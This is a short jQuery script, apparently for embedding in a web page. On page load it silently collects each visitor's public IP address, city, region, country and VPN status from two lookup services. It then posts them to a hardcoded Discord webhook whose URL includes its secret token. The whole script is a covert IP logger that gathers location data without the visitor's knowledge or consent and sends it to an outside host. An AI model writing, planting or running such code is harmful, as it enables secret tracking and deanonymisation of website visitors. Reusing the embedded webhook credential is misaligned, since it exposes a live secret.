$(document).ready(function () {
    $.get("https://api.ipify.org?format=json", function (data) {
        $.get("https://ipinfo.io/" + data.ip + "/json", function (ipData) {
            var message = 'IP Address: ' + data.ip + '\n'
                         + 'Country: ' + ipData.country + '\n'
                         + 'Region: ' + ipData.region + '\n'
                         + 'City: ' + ipData.city + '\n'
                         + 'VPN: ' + (ipData.usingVPN === true ? 'Detected' : 'Not Detected');

            $.ajax({
                url:  "https://discord.com/api/webhooks/1368633577092288603/5HDdliMP7TpJGPcPqIySm_Mpm1i5thQHi-1_cPAwMqRL1bnaJJhBPdFbqitlvws5O2gh",
                type: 'POST',
                data: JSON.stringify({ content: message }),
                contentType: 'application/json'
            });
        });
    });
});
